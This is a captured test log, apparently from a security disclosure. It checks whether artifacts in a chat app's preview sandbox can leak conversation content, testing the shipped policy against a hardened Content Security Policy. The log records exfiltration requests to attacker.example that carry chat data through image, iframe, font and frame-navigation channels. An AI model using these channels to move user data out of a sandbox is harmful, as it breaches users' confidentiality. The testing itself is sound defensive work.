@@ -1,0 +1,60 @@
+# Captured 2026-10-11 from ./run.sh (Chromium headless shell via Playwright 1.63.0, sandbox @54ed549, chat CSP from tinfoil-webapp @c061681)
+##### Run 1: shipped headers
+[ok] legit: html preview reports its height
+[ok] legit: js preview reports console output
+[ok] legit: artifact runs inline script with storage shims and data: images
+[LEAK] artifact: <img> to attacker (img-src https:)
+    image https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-via-img (frame=about:srcdoc, referer=null, origin=null, sec-fetch-dest=null)
+[LEAK] artifact: <iframe> to attacker page, which fetches home (frame-src https:)
+    document https://attacker.example/frame?d=CONFIDENTIAL_CHAT_CONTENT-via-frame (frame=, referer=null, origin=null, sec-fetch-dest=null)
+    fetch https://attacker.example/beacon?d=fetched-from-attacker-frame%3A%3Fd%3DCONFIDENTIAL_CHAT_CONTENT-via-frame (frame=https://attacker.example/frame?d=CONFIDENTIAL_CHAT_CONTENT-via-frame, referer=null, origin=null, sec-fetch-dest=null)
+[LEAK] artifact: self-navigation of the nested frame
+    document https://attacker.example/nav?d=CONFIDENTIAL_CHAT_CONTENT-via-navigation (frame=about:srcdoc, referer=null, origin=null, sec-fetch-dest=null)
+[LEAK] artifact: @font-face to attacker (font-src https:)
+    font https://attacker.example/font?d=CONFIDENTIAL_CHAT_CONTENT-via-font (frame=about:srcdoc, referer=null, origin=null, sec-fetch-dest=null)
+[no leak] artifact: fetch() to attacker (control: connect-src falls to default-src none)
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT' violates the following Content Security Policy directive: "default-src 'none'". Note 
+    csp: Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT. Refused to connect because it violates the document's Content Security Policy.
+[no leak] html preview: <img> to attacker (control: meta CSP img-src data:)
+    csp: Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-html-img' violates the following Content Security Policy directive: "img-src data:".
+[LEAK] html preview: self-navigation of the nested frame
+    document https://attacker.example/nav?d=CONFIDENTIAL_CHAT_CONTENT-html-navigation (frame=about:srcdoc, referer=null, origin=null, sec-fetch-dest=null)
+[no leak] js preview: fetch() to attacker (control: default-src none)
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: "default-src 'none'". No
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: "default-src 'none'". No
+    csp: Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js. Refused to connect because it violates the document's Content Security Poli
+[LEAK] js preview: self-navigation of the nested frame
+    document https://attacker.example/nav?d=CONFIDENTIAL_CHAT_CONTENT-js-navigation (frame=about:srcdoc, referer=null, origin=null, sec-fetch-dest=null)
+
+results written to /root/tinfoil-review/work/disclosures/16/out/sandbox-exfil-results.json
+[summary] shipped headers: 6/9 cases reached the attacker (3 of the 9 are fetch/meta-CSP controls that stay blocked under either policy); legitimate flows working: 3/3; requests to any other host: 0
+
+##### Run 2: hardened CSP (negative control / fix validation)
+[ok] legit: html preview reports its height
+[ok] legit: js preview reports console output
+[ok] legit: artifact runs inline script with storage shims and data: images
+[no leak] artifact: <img> to attacker (img-src https:)
+    csp: Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-via-img' violates the following Content Security Policy directive: "img-src data: bl
+[no leak] artifact: <iframe> to attacker page, which fetches home (frame-src https:)
+    csp: Framing 'https://attacker.example/' violates the following Content Security Policy directive: "default-src 'none'". The request has been blocked. Note that 'fra
+[no leak] artifact: self-navigation of the nested frame
+    csp: Framing 'https://attacker.example/' violates the following Content Security Policy directive: "default-src 'none'". The request has been blocked. Note that 'fra
+[no leak] artifact: @font-face to attacker (font-src https:)
+    csp: Loading the font 'https://attacker.example/font?d=CONFIDENTIAL_CHAT_CONTENT-via-font' violates the following Content Security Policy directive: "font-src data:"
+[no leak] artifact: fetch() to attacker (control: connect-src falls to default-src none)
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT' violates the following Content Security Policy directive: "default-src 'none'". Note 
+    csp: Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT. Refused to connect because it violates the document's Content Security Policy.
+[no leak] html preview: <img> to attacker (control: meta CSP img-src data:)
+    csp: Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-html-img' violates the following Content Security Policy directive: "img-src data: b
+    csp: Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-html-img' violates the following Content Security Policy directive: "img-src data:".
+[no leak] html preview: self-navigation of the nested frame
+    csp: Framing 'https://attacker.example/' violates the following Content Security Policy directive: "default-src 'none'". The request has been blocked. Note that 'fra
+[no leak] js preview: fetch() to attacker (control: default-src none)
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: "default-src 'none'". No
+    csp: Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: "default-src 'none'". No
+    csp: Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js. Refused to connect because it violates the document's Content Security Poli
+[no leak] js preview: self-navigation of the nested frame
+    csp: Framing 'https://attacker.example/' violates the following Content Security Policy directive: "default-src 'none'". The request has been blocked. Note that 'fra
+
+results written to /root/tinfoil-review/work/disclosures/16/out/sandbox-exfil-results-hardened-csp.json
+[summary] hardened CSP: 0/9 cases reached the attacker (3 of the 9 are fetch/meta-CSP controls that stay blocked under either policy); legitimate flows working: 3/3; requests to any other host: 0
